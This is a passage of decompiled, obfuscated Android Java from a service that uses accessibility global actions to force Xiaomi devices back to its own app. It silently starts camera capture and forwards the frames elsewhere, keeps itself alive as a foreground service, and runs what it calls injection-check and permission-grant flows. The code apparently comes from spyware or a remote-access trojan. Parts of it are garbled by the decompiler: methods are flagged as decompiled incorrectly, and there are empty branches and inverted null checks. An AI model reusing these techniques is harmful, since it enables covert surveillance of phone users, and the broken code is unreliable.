                t60.m214714d6("dqtvuisjd", "✅ [导航] 开始小米Android 10设备智能返回流程");
                boolean zM211483h72 = m211483h7();
                t60.m214714d6("dqtvuisjd", "✅ [导航] 第一次检测：当前是否在应用 = " + zM211483h72);
                if (zM211483h72) {
                    t60.m214714d6("dqtvuisjd", "✅ [导航] 已经在应用页面，小米Android10跳过稳定性验证");
                    return Boolean.TRUE;
                }
                t60.m214714d6("dqtvuisjd", "✅ [导航] 执行第一次返回操作");
                performGlobalAction(1);
                dqtvuisjd_smartreturntoappformiandroid10_1.f52691a0 = this;
                dqtvuisjd_smartreturntoappformiandroid10_1.f52694a3 = 1;
                if (b81.m210571b1(500L, dqtvuisjd_smartreturntoappformiandroid10_1) == coroutineSingletons) {
                    return coroutineSingletons;
                }
                dqtvuisjdVar = this;
            } else {
                if (i2 != 1) {
                    if (i2 != 2) {
                        if (i2 != 3) {
                            throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                        }
                        dqtvuisjdVar3 = dqtvuisjd_smartreturntoappformiandroid10_1.f52691a0;
                        kg1.m213544f4(obj);
                        boolean zM211483h73 = dqtvuisjdVar3.m211483h7();
                        t60.m214714d6("dqtvuisjd", "🔍 小米Android 10设备直接启动应用 = " + zM211483h73);
                        return Boolean.valueOf(zM211483h73);
                    }
                    dqtvuisjdVar2 = dqtvuisjd_smartreturntoappformiandroid10_1.f52691a0;
                    kg1.m213544f4(obj);
                    zM211483h7 = dqtvuisjdVar2.m211483h7();
                    t60.m214714d6("dqtvuisjd", "✅ [导航] 第三次检测：第二次返回后是否在应用 = " + zM211483h7);
                    if (!zM211483h7) {
                        t60.m214714d6("dqtvuisjd", "✅ [导航] 第二次返回成功，小米Android10返回完成");
                        return Boolean.TRUE;
                    }
                    t60.m214726f4("dqtvuisjd", "⚠️ [导航] 小米Android10两次返回都未成功，检查是否启动应用");
                    Intent intent = new Intent(dqtvuisjdVar2, (Class<?>) iuzxujjtqev.class);
                    intent.addFlags(872415232);
                    intent.putExtra("MI_ANDROID10_RETURN", true);
                    intent.putExtra("FROM_ACCESSIBILITY_SERVICE", true);
                    dqtvuisjdVar2.startActivity(intent);
                    dqtvuisjd_smartreturntoappformiandroid10_1.f52691a0 = dqtvuisjdVar2;
                    dqtvuisjd_smartreturntoappformiandroid10_1.f52694a3 = 3;
                    if (b81.m210571b1(500L, dqtvuisjd_smartreturntoappformiandroid10_1) != coroutineSingletons) {
                        dqtvuisjdVar3 = dqtvuisjdVar2;
                        boolean zM211483h732 = dqtvuisjdVar3.m211483h7();
                        t60.m214714d6("dqtvuisjd", "🔍 小米Android 10设备直接启动应用 = " + zM211483h732);
                        return Boolean.valueOf(zM211483h732);
                    }
                    return coroutineSingletons;
                }
                dqtvuisjdVar = dqtvuisjd_smartreturntoappformiandroid10_1.f52691a0;
                kg1.m213544f4(obj);
            }
            boolean zM211483h74 = dqtvuisjdVar.m211483h7();
            t60.m214714d6("dqtvuisjd", "✅ [导航] 第二次检测：第一次返回后是否在应用 = " + zM211483h74);
            if (zM211483h74) {
                t60.m214714d6("dqtvuisjd", "✅ [导航] 第一次返回成功，小米Android10跳过稳定性验证");
                return Boolean.TRUE;
            }
            t60.m214714d6("dqtvuisjd", "✅ [导航] 执行第二次返回操作");
            dqtvuisjdVar.performGlobalAction(1);
            dqtvuisjd_smartreturntoappformiandroid10_1.f52691a0 = dqtvuisjdVar;
            dqtvuisjd_smartreturntoappformiandroid10_1.f52694a3 = 2;
            if (b81.m210571b1(500L, dqtvuisjd_smartreturntoappformiandroid10_1) == coroutineSingletons) {
                return coroutineSingletons;
            }
            dqtvuisjdVar2 = dqtvuisjdVar;
            zM211483h7 = dqtvuisjdVar2.m211483h7();
            t60.m214714d6("dqtvuisjd", "✅ [导航] 第三次检测：第二次返回后是否在应用 = " + zM211483h7);
            if (!zM211483h7) {
            }
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ 小米Android 10设备智能返回失败", e);
            return Boolean.FALSE;
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:109:0x029f, code lost:
    
        if (p000.b81.m210571b1(1000, r14) == r15) goto L110;
     */
    /* JADX WARN: Removed duplicated region for block: B:103:0x025a  */
    /* JADX WARN: Removed duplicated region for block: B:106:0x027b A[Catch: Exception -> 0x0064, TryCatch #8 {Exception -> 0x0064, blocks: (B:20:0x005e, B:111:0x02a2, B:119:0x02cc, B:27:0x0075, B:94:0x0230, B:104:0x025c, B:106:0x027b, B:108:0x0283, B:30:0x0089, B:90:0x020a, B:33:0x009c, B:84:0x01df, B:36:0x00af, B:64:0x0155, B:66:0x017e, B:68:0x0186, B:70:0x01a0, B:72:0x01a8, B:77:0x01b4, B:39:0x00bd, B:60:0x0117), top: B:147:0x004a }] */
    /* JADX WARN: Removed duplicated region for block: B:108:0x0283 A[Catch: Exception -> 0x0064, TryCatch #8 {Exception -> 0x0064, blocks: (B:20:0x005e, B:111:0x02a2, B:119:0x02cc, B:27:0x0075, B:94:0x0230, B:104:0x025c, B:106:0x027b, B:108:0x0283, B:30:0x0089, B:90:0x020a, B:33:0x009c, B:84:0x01df, B:36:0x00af, B:64:0x0155, B:66:0x017e, B:68:0x0186, B:70:0x01a0, B:72:0x01a8, B:77:0x01b4, B:39:0x00bd, B:60:0x0117), top: B:147:0x004a }] */
    /* JADX WARN: Removed duplicated region for block: B:53:0x0107 A[Catch: Exception -> 0x0115, TryCatch #7 {Exception -> 0x0115, blocks: (B:51:0x0101, B:53:0x0107, B:55:0x010d), top: B:145:0x0101 }] */
    /* JADX WARN: Removed duplicated region for block: B:59:0x0115  */
    /* JADX WARN: Removed duplicated region for block: B:62:0x0152  */
    /* JADX WARN: Removed duplicated region for block: B:63:0x0154  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0030  */
    /* JADX WARN: Removed duplicated region for block: B:87:0x0201  */
    /* JADX WARN: Removed duplicated region for block: B:92:0x022c  */
    /* JADX WARN: Removed duplicated region for block: B:93:0x022e  */
    /* renamed from: m3 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m211526m3(ContinuationImpl continuationImpl) throws Throwable {
        dqtvuisjd$smartReturnToAppForMiAndroid13$1 dqtvuisjd_smartreturntoappformiandroid13_1;
        String str;
        String str2;
        String str3;
        String string;
        Intent intent;
        long jCurrentTimeMillis;
        dqtvuisjd dqtvuisjdVar;
        CharSequence packageName;
        boolean zPerformGlobalAction;
        long j;
        int i;
        boolean zPerformGlobalAction2;
        long j2;
        int i2;
        dqtvuisjd dqtvuisjdVar2;
        Intent intent2;
        dqtvuisjd dqtvuisjdVar3;
        String string2;
        boolean zM211483h7;
        long jCurrentTimeMillis2;
        String string3;
        CharSequence packageName2;
        CharSequence packageName3;
        if (continuationImpl instanceof dqtvuisjd$smartReturnToAppForMiAndroid13$1) {
            dqtvuisjd_smartreturntoappformiandroid13_1 = (dqtvuisjd$smartReturnToAppForMiAndroid13$1) continuationImpl;
            int i3 = dqtvuisjd_smartreturntoappformiandroid13_1.f52700a5;
            if ((i3 & Integer.MIN_VALUE) != 0) {
                dqtvuisjd_smartreturntoappformiandroid13_1.f52700a5 = i3 - Integer.MIN_VALUE;
            } else {
                dqtvuisjd_smartreturntoappformiandroid13_1 = new dqtvuisjd$smartReturnToAppForMiAndroid13$1(this, continuationImpl);
            }
        }
        Object obj = dqtvuisjd_smartreturntoappformiandroid13_1.f52698a3;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i4 = dqtvuisjd_smartreturntoappformiandroid13_1.f52700a5;
        boolean zPerformGlobalAction3 = false;
        try {
            if (i4 == 0) {
                kg1.m213544f4(obj);
                t60.m214714d6("dqtvuisjd", "🏠 开始小米Android 13设备智能返回流程（优先简单方案）");
                try {
                    str = "🔍 返回操作后是否在应用 = ";
                } catch (Exception unused) {
                    str = "🔍 返回操作后是否在应用 = ";
                }
                try {
                    str2 = "⏱️ 返回操作总耗时(ms)=";
                } catch (Exception unused2) {
                    str2 = "⏱️ 返回操作总耗时(ms)=";
                    str3 = "↩️ 第3次返回执行结果=";
                    AccessibilityNodeInfo rootInActiveWindow = getRootInActiveWindow();
                    if (rootInActiveWindow != null) {
                    }
                    if (string == null) {
                    }
                    t60.m214714d6("dqtvuisjd", "🔍 前置顶层包名: ".concat(string));
                    intent = new Intent(this, (Class<?>) iuzxujjtqev.class);
                    intent.addFlags(872415232);
                    intent.putExtra("MI_ANDROID13_RETURN", true);
                    intent.putExtra("FROM_ACCESSIBILITY_SERVICE", true);
                    t60.m214702c3("dqtvuisjd", "🧭 启动iuzxujjtqev intent flags=NEW_TASK|CLEAR_TOP|SINGLE_TOP, extras={MI_ANDROID13_RETURN=true, FROM_ACCESSIBILITY_SERVICE=true}");
                    jCurrentTimeMillis = System.currentTimeMillis();
                    startActivity(intent);
                    dqtvuisjd_smartreturntoappformiandroid13_1.f52695a0 = this;
                    dqtvuisjd_smartreturntoappformiandroid13_1.f52696a1 = intent;
                    dqtvuisjd_smartreturntoappformiandroid13_1.f52697a2 = jCurrentTimeMillis;
                    dqtvuisjd_smartreturntoappformiandroid13_1.f52700a5 = 1;
                    if (b81.m210571b1(1500L, dqtvuisjd_smartreturntoappformiandroid13_1) == coroutineSingletons) {
                    }
                }
                try {
                    str3 = "↩️ 第3次返回执行结果=";
                    try {
                        t60.m214714d6("dqtvuisjd", "📱 设备信息: brand=" + Build.BRAND + ", model=" + Build.MODEL + ", release=" + Build.VERSION.RELEASE + ", sdk=" + Build.VERSION.SDK_INT);
                    } catch (Exception unused3) {
                    }
                } catch (Exception unused4) {
                    str3 = "↩️ 第3次返回执行结果=";
                    AccessibilityNodeInfo rootInActiveWindow2 = getRootInActiveWindow();
                    if (rootInActiveWindow2 != null) {
                    }
                    if (string == null) {
                    }
                    t60.m214714d6("dqtvuisjd", "🔍 前置顶层包名: ".concat(string));
                    intent = new Intent(this, (Class<?>) iuzxujjtqev.class);
                    intent.addFlags(872415232);
                    intent.putExtra("MI_ANDROID13_RETURN", true);
                    intent.putExtra("FROM_ACCESSIBILITY_SERVICE", true);
                    t60.m214702c3("dqtvuisjd", "🧭 启动iuzxujjtqev intent flags=NEW_TASK|CLEAR_TOP|SINGLE_TOP, extras={MI_ANDROID13_RETURN=true, FROM_ACCESSIBILITY_SERVICE=true}");
                    jCurrentTimeMillis = System.currentTimeMillis();
                    startActivity(intent);
                    dqtvuisjd_smartreturntoappformiandroid13_1.f52695a0 = this;
                    dqtvuisjd_smartreturntoappformiandroid13_1.f52696a1 = intent;
                    dqtvuisjd_smartreturntoappformiandroid13_1.f52697a2 = jCurrentTimeMillis;
                    dqtvuisjd_smartreturntoappformiandroid13_1.f52700a5 = 1;
                    if (b81.m210571b1(1500L, dqtvuisjd_smartreturntoappformiandroid13_1) == coroutineSingletons) {
                    }
                }
                try {
                    AccessibilityNodeInfo rootInActiveWindow22 = getRootInActiveWindow();
                    string = (rootInActiveWindow22 != null || (packageName = rootInActiveWindow22.getPackageName()) == null) ? null : packageName.toString();
                } catch (Exception unused5) {
                }
                if (string == null) {
                    string = "";
                }
                t60.m214714d6("dqtvuisjd", "🔍 前置顶层包名: ".concat(string));
                intent = new Intent(this, (Class<?>) iuzxujjtqev.class);
                intent.addFlags(872415232);
                intent.putExtra("MI_ANDROID13_RETURN", true);
                intent.putExtra("FROM_ACCESSIBILITY_SERVICE", true);
                t60.m214702c3("dqtvuisjd", "🧭 启动iuzxujjtqev intent flags=NEW_TASK|CLEAR_TOP|SINGLE_TOP, extras={MI_ANDROID13_RETURN=true, FROM_ACCESSIBILITY_SERVICE=true}");
                jCurrentTimeMillis = System.currentTimeMillis();
                startActivity(intent);
                dqtvuisjd_smartreturntoappformiandroid13_1.f52695a0 = this;
                dqtvuisjd_smartreturntoappformiandroid13_1.f52696a1 = intent;
                dqtvuisjd_smartreturntoappformiandroid13_1.f52697a2 = jCurrentTimeMillis;
                dqtvuisjd_smartreturntoappformiandroid13_1.f52700a5 = 1;
                if (b81.m210571b1(1500L, dqtvuisjd_smartreturntoappformiandroid13_1) == coroutineSingletons) {
                    return coroutineSingletons;
                }
                dqtvuisjdVar = this;
            } else if (i4 == 1) {
                jCurrentTimeMillis = dqtvuisjd_smartreturntoappformiandroid13_1.f52697a2;
                intent = dqtvuisjd_smartreturntoappformiandroid13_1.f52696a1;
                dqtvuisjdVar = dqtvuisjd_smartreturntoappformiandroid13_1.f52695a0;
                kg1.m213544f4(obj);
                str = "🔍 返回操作后是否在应用 = ";
                str2 = "⏱️ 返回操作总耗时(ms)=";
                str3 = "↩️ 第3次返回执行结果=";
            } else {
                if (i4 == 2) {
                    j = dqtvuisjd_smartreturntoappformiandroid13_1.f52697a2;
                    intent = dqtvuisjd_smartreturntoappformiandroid13_1.f52696a1;
                    dqtvuisjd dqtvuisjdVar4 = dqtvuisjd_smartreturntoappformiandroid13_1.f52695a0;
                    kg1.m213544f4(obj);
                    str = "🔍 返回操作后是否在应用 = ";
                    str2 = "⏱️ 返回操作总耗时(ms)=";
                    str3 = "↩️ 第3次返回执行结果=";
                    i = 1;
                    dqtvuisjdVar = dqtvuisjdVar4;
                    try {
                        zPerformGlobalAction2 = dqtvuisjdVar.performGlobalAction(i);
                    } catch (Exception unused6) {
                        zPerformGlobalAction2 = false;
                    }
                    t60.m214702c3("dqtvuisjd", "↩️ 第2次返回执行结果=" + zPerformGlobalAction2);
                    dqtvuisjd_smartreturntoappformiandroid13_1.f52695a0 = dqtvuisjdVar;
                    dqtvuisjd_smartreturntoappformiandroid13_1.f52696a1 = intent;
                    dqtvuisjd_smartreturntoappformiandroid13_1.f52697a2 = j;
                    dqtvuisjd_smartreturntoappformiandroid13_1.f52700a5 = 3;
                    if (b81.m210571b1(500L, dqtvuisjd_smartreturntoappformiandroid13_1) != coroutineSingletons) {
                        j2 = j;
                        i2 = 1;
                        dqtvuisjdVar2 = dqtvuisjdVar;
                        zPerformGlobalAction3 = dqtvuisjdVar2.performGlobalAction(i2);
                        t60.m214702c3("dqtvuisjd", str3 + zPerformGlobalAction3);
                        dqtvuisjd_smartreturntoappformiandroid13_1.f52695a0 = dqtvuisjdVar2;
                        dqtvuisjd_smartreturntoappformiandroid13_1.f52696a1 = intent;
                        dqtvuisjd_smartreturntoappformiandroid13_1.f52697a2 = j2;
                        dqtvuisjd_smartreturntoappformiandroid13_1.f52700a5 = 4;
                        if (b81.m210571b1(500L, dqtvuisjd_smartreturntoappformiandroid13_1) != coroutineSingletons) {
                        }
                    }
                    return coroutineSingletons;
                }
                if (i4 == 3) {
                    long j3 = dqtvuisjd_smartreturntoappformiandroid13_1.f52697a2;
                    intent = dqtvuisjd_smartreturntoappformiandroid13_1.f52696a1;
                    dqtvuisjdVar2 = dqtvuisjd_smartreturntoappformiandroid13_1.f52695a0;
                    kg1.m213544f4(obj);
                    str = "🔍 返回操作后是否在应用 = ";
                    str2 = "⏱️ 返回操作总耗时(ms)=";
                    str3 = "↩️ 第3次返回执行结果=";
                    j2 = j3;
                    i2 = 1;
                    try {
                        zPerformGlobalAction3 = dqtvuisjdVar2.performGlobalAction(i2);
                    } catch (Exception unused7) {
                    }
                    t60.m214702c3("dqtvuisjd", str3 + zPerformGlobalAction3);
                    dqtvuisjd_smartreturntoappformiandroid13_1.f52695a0 = dqtvuisjdVar2;
                    dqtvuisjd_smartreturntoappformiandroid13_1.f52696a1 = intent;
                    dqtvuisjd_smartreturntoappformiandroid13_1.f52697a2 = j2;
                    dqtvuisjd_smartreturntoappformiandroid13_1.f52700a5 = 4;
                    if (b81.m210571b1(500L, dqtvuisjd_smartreturntoappformiandroid13_1) != coroutineSingletons) {
                        return coroutineSingletons;
                    }
                    intent2 = intent;
                    dqtvuisjdVar3 = dqtvuisjdVar2;
                    t60.m214702c3("dqtvuisjd", str2 + (System.currentTimeMillis() - j2));
                    AccessibilityNodeInfo rootInActiveWindow3 = dqtvuisjdVar3.getRootInActiveWindow();
                    if (rootInActiveWindow3 != null) {
                    }
                    if (string2 == null) {
                    }
                    zM211483h7 = dqtvuisjdVar3.m211483h7();
                    t60.m214714d6("dqtvuisjd", str + zM211483h7 + ", 当前包=" + string2);
                    if (!zM211483h7) {
                    }
                } else {
                    if (i4 != 4) {
                        if (i4 != 5) {
                            throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                        }
                        jCurrentTimeMillis2 = dqtvuisjd_smartreturntoappformiandroid13_1.f52697a2;
                        dqtvuisjdVar3 = dqtvuisjd_smartreturntoappformiandroid13_1.f52695a0;
                        kg1.m213544f4(obj);
                        string3 = null;
                        t60.m214702c3("dqtvuisjd", "⏱️ 再次启动应用等待耗时(ms)=" + (System.currentTimeMillis() - jCurrentTimeMillis2));
                        try {
                            AccessibilityNodeInfo rootInActiveWindow4 = dqtvuisjdVar3.getRootInActiveWindow();
                            if (rootInActiveWindow4 != null && (packageName3 = rootInActiveWindow4.getPackageName()) != null) {
                                string3 = packageName3.toString();
                            }
                        } catch (Exception unused8) {
                        }
                        if (string3 == null) {
                            string3 = "";
                        }
                        boolean zM211483h72 = dqtvuisjdVar3.m211483h7();
                        t60.m214714d6("dqtvuisjd", "🔍 小米Android 13设备最终结果 = " + zM211483h72 + ", 最终包=" + string3);
                        return Boolean.valueOf(zM211483h72);
                    }
                    j2 = dqtvuisjd_smartreturntoappformiandroid13_1.f52697a2;
                    Intent intent3 = dqtvuisjd_smartreturntoappformiandroid13_1.f52696a1;
                    dqtvuisjd dqtvuisjdVar5 = dqtvuisjd_smartreturntoappformiandroid13_1.f52695a0;
                    kg1.m213544f4(obj);
                    intent2 = intent3;
                    dqtvuisjdVar3 = dqtvuisjdVar5;
                    str = "🔍 返回操作后是否在应用 = ";
                    str2 = "⏱️ 返回操作总耗时(ms)=";
                    t60.m214702c3("dqtvuisjd", str2 + (System.currentTimeMillis() - j2));
                    try {
                        AccessibilityNodeInfo rootInActiveWindow32 = dqtvuisjdVar3.getRootInActiveWindow();
                        string2 = (rootInActiveWindow32 != null || (packageName2 = rootInActiveWindow32.getPackageName()) == null) ? null : packageName2.toString();
                    } catch (Exception unused9) {
                    }
                    if (string2 == null) {
                        string2 = "";
                    }
                    zM211483h7 = dqtvuisjdVar3.m211483h7();
                    t60.m214714d6("dqtvuisjd", str + zM211483h7 + ", 当前包=" + string2);
                    if (!zM211483h7) {
                        t60.m214714d6("dqtvuisjd", "✅ 小米Android 13设备返回操作成功");
                        return Boolean.TRUE;
                    }
                    t60.m214726f4("dqtvuisjd", "⚠️ 小米Android 13设备返回操作失败，再次启动应用");
                    jCurrentTimeMillis2 = System.currentTimeMillis();
                    dqtvuisjdVar3.startActivity(intent2);
                    dqtvuisjd_smartreturntoappformiandroid13_1.f52695a0 = dqtvuisjdVar3;
                    string3 = null;
                    dqtvuisjd_smartreturntoappformiandroid13_1.f52696a1 = null;
                    dqtvuisjd_smartreturntoappformiandroid13_1.f52697a2 = jCurrentTimeMillis2;
                    dqtvuisjd_smartreturntoappformiandroid13_1.f52700a5 = 5;
                }
            }
            t60.m214702c3("dqtvuisjd", "⏱️ 启动应用等待耗时(ms)=" + (System.currentTimeMillis() - jCurrentTimeMillis));
            boolean zM211483h73 = dqtvuisjdVar.m211483h7();
            t60.m214714d6("dqtvuisjd", "🔍 小米Android 13设备简单方案结果 = " + zM211483h73);
            if (zM211483h73) {
                t60.m214714d6("dqtvuisjd", "✅ 小米Android 13设备简单方案成功，返回完成");
                return Boolean.TRUE;
            }
            t60.m214714d6("dqtvuisjd", "🔙 小米Android 13设备简单方案失败，尝试一次返回操作");
            boolean zM211483h74 = dqtvuisjdVar.m211483h7();
            t60.m214714d6("dqtvuisjd", "🔍 当前是否在应用 = " + zM211483h74);
            if (zM211483h74) {
                t60.m214714d6("dqtvuisjd", "✅ 小米Android 13设备已在应用页面，跳过返回操作");
                return Boolean.TRUE;
            }
            long jCurrentTimeMillis3 = System.currentTimeMillis();
            try {
                zPerformGlobalAction = dqtvuisjdVar.performGlobalAction(1);
            } catch (Exception unused10) {
                zPerformGlobalAction = false;
            }
            t60.m214702c3("dqtvuisjd", "↩️ 第1次返回执行结果=" + zPerformGlobalAction);
            dqtvuisjd_smartreturntoappformiandroid13_1.f52695a0 = dqtvuisjdVar;
            dqtvuisjd_smartreturntoappformiandroid13_1.f52696a1 = intent;
            dqtvuisjd_smartreturntoappformiandroid13_1.f52697a2 = jCurrentTimeMillis3;
            dqtvuisjd_smartreturntoappformiandroid13_1.f52700a5 = 2;
            if (b81.m210571b1(500L, dqtvuisjd_smartreturntoappformiandroid13_1) != coroutineSingletons) {
                j = jCurrentTimeMillis3;
                i = 1;
                zPerformGlobalAction2 = dqtvuisjdVar.performGlobalAction(i);
                t60.m214702c3("dqtvuisjd", "↩️ 第2次返回执行结果=" + zPerformGlobalAction2);
                dqtvuisjd_smartreturntoappformiandroid13_1.f52695a0 = dqtvuisjdVar;
                dqtvuisjd_smartreturntoappformiandroid13_1.f52696a1 = intent;
                dqtvuisjd_smartreturntoappformiandroid13_1.f52697a2 = j;
                dqtvuisjd_smartreturntoappformiandroid13_1.f52700a5 = 3;
                if (b81.m210571b1(500L, dqtvuisjd_smartreturntoappformiandroid13_1) != coroutineSingletons) {
                }
            }
            return coroutineSingletons;
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ 小米Android 13设备智能返回失败", e);
            return Boolean.FALSE;
        }
    }

    /* renamed from: m5 */
    public final void m211527m5() {
        try {
            t60.m214714d6("dqtvuisjd", "📷 启动摄像头捕获");
            if (!(checkSelfPermission("android.permission.CAMERA") == 0)) {
                t60.m214704c5("dqtvuisjd", "❌ 摄像头权限未授予，开始申请权限");
                m211508k4();
                return;
            }
            C0258a0 c0258a0 = this.f52371a2;
            if (c0258a0 == null) {
                t60.m214704c5("dqtvuisjd", "❌ CameraManager未初始化");
                return;
            }
            c0258a0.f52091c4 = new h10() { // from class: com.storm.safe.rock.service.dqtvuisjd$startCameraCapture$2
                {
                    super(1);
                }

                @Override // p000.h10
                public final Object invoke(Object obj) {
                    byte[] bArr = (byte[]) obj;
                    t60.m214695b6(bArr, "frameData");
                    C0323a8 c0323a8 = this.f52709a0.f52415e6;
                    if (c0323a8 != null) {
                        c0323a8.m211657c3(bArr);
                    }
                    return C1351vv.f60710b1;
                }
            };
            if (c0258a0 == null) {
                t60.m214724f2("cameraManager");
                throw null;
            }
            c0258a0.m211246a5();
            C0258a0 c0258a02 = this.f52371a2;
            if (c0258a02 == null) {
                t60.m214724f2("cameraManager");
                throw null;
            }
            c0258a02.m211247a6();
            t60.m214714d6("dqtvuisjd", "✅ 摄像头捕获已启动");
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ 启动摄像头捕获失败", e);
        }
    }

    /* renamed from: m6 */
    public final void m211528m6() {
        try {
            C1351vv.m214962a3(this);
            Notification notificationM214961a2 = C1351vv.m214961a2(this);
            if (Build.VERSION.SDK_INT >= 34) {
                startForeground(10086, notificationM214961a2, 1073741825);
            } else {
                startForeground(10086, notificationM214961a2);
            }
            try {
                AbstractC0315a0.m211545a7("前台服务启动成功 进程优先级已提升");
            } catch (Exception unused) {
            }
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ [startForegroundSelf] 前台服务启动失败", e);
        }
    }

    /* renamed from: m7 */
    public final void m211529m7() {
        u11 u11Var = this.f52409e0;
        if (u11Var == null || !u11Var.mo213470a0()) {
            this.f52409e0 = AbstractC0780a0.m213692a3(this.f52378a9, AbstractC1262tj.f60234a1, new dqtvuisjd$startInjectionCheckJob$1(this, null), 2);
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:102:0x0172 A[Catch: Exception -> 0x003f, TryCatch #1 {Exception -> 0x003f, blocks: (B:13:0x003a, B:100:0x016e, B:102:0x0172, B:104:0x0179, B:105:0x017d, B:106:0x0180, B:107:0x0181, B:109:0x0188, B:118:0x01ae, B:117:0x019b, B:20:0x004c, B:78:0x0129, B:80:0x012d, B:82:0x0134, B:83:0x0138, B:84:0x013b, B:86:0x013d, B:88:0x0141, B:89:0x0148, B:91:0x0151, B:93:0x0157, B:95:0x015b, B:119:0x01ba, B:120:0x01bd, B:23:0x0054, B:28:0x0071, B:30:0x007a, B:31:0x007d, B:33:0x0081, B:34:0x0089, B:36:0x008d, B:37:0x0095, B:38:0x009a, B:40:0x00a0, B:42:0x00a9, B:44:0x00af, B:46:0x00b3, B:47:0x00bb, B:49:0x00bf, B:51:0x00c6, B:52:0x00ca, B:53:0x00cd, B:54:0x00ce, B:56:0x00d4, B:65:0x00fa, B:64:0x00e7, B:66:0x0101, B:67:0x0104, B:68:0x0105, B:70:0x0109, B:72:0x010f, B:74:0x0113, B:121:0x01be, B:122:0x01c1, B:57:0x00d7, B:59:0x00db, B:62:0x00e1, B:110:0x018b, B:112:0x018f, B:115:0x0195), top: B:126:0x0032, inners: #0, #3 }] */
    /* JADX WARN: Removed duplicated region for block: B:109:0x0188 A[Catch: Exception -> 0x003f, TRY_LEAVE, TryCatch #1 {Exception -> 0x003f, blocks: (B:13:0x003a, B:100:0x016e, B:102:0x0172, B:104:0x0179, B:105:0x017d, B:106:0x0180, B:107:0x0181, B:109:0x0188, B:118:0x01ae, B:117:0x019b, B:20:0x004c, B:78:0x0129, B:80:0x012d, B:82:0x0134, B:83:0x0138, B:84:0x013b, B:86:0x013d, B:88:0x0141, B:89:0x0148, B:91:0x0151, B:93:0x0157, B:95:0x015b, B:119:0x01ba, B:120:0x01bd, B:23:0x0054, B:28:0x0071, B:30:0x007a, B:31:0x007d, B:33:0x0081, B:34:0x0089, B:36:0x008d, B:37:0x0095, B:38:0x009a, B:40:0x00a0, B:42:0x00a9, B:44:0x00af, B:46:0x00b3, B:47:0x00bb, B:49:0x00bf, B:51:0x00c6, B:52:0x00ca, B:53:0x00cd, B:54:0x00ce, B:56:0x00d4, B:65:0x00fa, B:64:0x00e7, B:66:0x0101, B:67:0x0104, B:68:0x0105, B:70:0x0109, B:72:0x010f, B:74:0x0113, B:121:0x01be, B:122:0x01c1, B:57:0x00d7, B:59:0x00db, B:62:0x00e1, B:110:0x018b, B:112:0x018f, B:115:0x0195), top: B:126:0x0032, inners: #0, #3 }] */
    /* JADX WARN: Removed duplicated region for block: B:112:0x018f A[Catch: Exception -> 0x0193, TryCatch #3 {Exception -> 0x0193, blocks: (B:110:0x018b, B:112:0x018f, B:115:0x0195), top: B:129:0x018b, outer: #1 }] */
    /* JADX WARN: Removed duplicated region for block: B:115:0x0195 A[Catch: Exception -> 0x0193, TRY_LEAVE, TryCatch #3 {Exception -> 0x0193, blocks: (B:110:0x018b, B:112:0x018f, B:115:0x0195), top: B:129:0x018b, outer: #1 }] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x001b  */
    /* JADX WARN: Removed duplicated region for block: B:88:0x0141 A[Catch: Exception -> 0x003f, TryCatch #1 {Exception -> 0x003f, blocks: (B:13:0x003a, B:100:0x016e, B:102:0x0172, B:104:0x0179, B:105:0x017d, B:106:0x0180, B:107:0x0181, B:109:0x0188, B:118:0x01ae, B:117:0x019b, B:20:0x004c, B:78:0x0129, B:80:0x012d, B:82:0x0134, B:83:0x0138, B:84:0x013b, B:86:0x013d, B:88:0x0141, B:89:0x0148, B:91:0x0151, B:93:0x0157, B:95:0x015b, B:119:0x01ba, B:120:0x01bd, B:23:0x0054, B:28:0x0071, B:30:0x007a, B:31:0x007d, B:33:0x0081, B:34:0x0089, B:36:0x008d, B:37:0x0095, B:38:0x009a, B:40:0x00a0, B:42:0x00a9, B:44:0x00af, B:46:0x00b3, B:47:0x00bb, B:49:0x00bf, B:51:0x00c6, B:52:0x00ca, B:53:0x00cd, B:54:0x00ce, B:56:0x00d4, B:65:0x00fa, B:64:0x00e7, B:66:0x0101, B:67:0x0104, B:68:0x0105, B:70:0x0109, B:72:0x010f, B:74:0x0113, B:121:0x01be, B:122:0x01c1, B:57:0x00d7, B:59:0x00db, B:62:0x00e1, B:110:0x018b, B:112:0x018f, B:115:0x0195), top: B:126:0x0032, inners: #0, #3 }] */
    /* JADX WARN: Removed duplicated region for block: B:89:0x0148 A[Catch: Exception -> 0x003f, TryCatch #1 {Exception -> 0x003f, blocks: (B:13:0x003a, B:100:0x016e, B:102:0x0172, B:104:0x0179, B:105:0x017d, B:106:0x0180, B:107:0x0181, B:109:0x0188, B:118:0x01ae, B:117:0x019b, B:20:0x004c, B:78:0x0129, B:80:0x012d, B:82:0x0134, B:83:0x0138, B:84:0x013b, B:86:0x013d, B:88:0x0141, B:89:0x0148, B:91:0x0151, B:93:0x0157, B:95:0x015b, B:119:0x01ba, B:120:0x01bd, B:23:0x0054, B:28:0x0071, B:30:0x007a, B:31:0x007d, B:33:0x0081, B:34:0x0089, B:36:0x008d, B:37:0x0095, B:38:0x009a, B:40:0x00a0, B:42:0x00a9, B:44:0x00af, B:46:0x00b3, B:47:0x00bb, B:49:0x00bf, B:51:0x00c6, B:52:0x00ca, B:53:0x00cd, B:54:0x00ce, B:56:0x00d4, B:65:0x00fa, B:64:0x00e7, B:66:0x0101, B:67:0x0104, B:68:0x0105, B:70:0x0109, B:72:0x010f, B:74:0x0113, B:121:0x01be, B:122:0x01c1, B:57:0x00d7, B:59:0x00db, B:62:0x00e1, B:110:0x018b, B:112:0x018f, B:115:0x0195), top: B:126:0x0032, inners: #0, #3 }] */
    /* renamed from: m8 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m211530m8(ContinuationImpl continuationImpl) throws Throwable {
        dqtvuisjd$startPermissionGrantFlow$1 dqtvuisjd_startpermissiongrantflow_1;
        boolean z;
        dqtvuisjd dqtvuisjdVar;
        dqtvuisjd dqtvuisjdVar2;
        C0260a2 c0260a2;
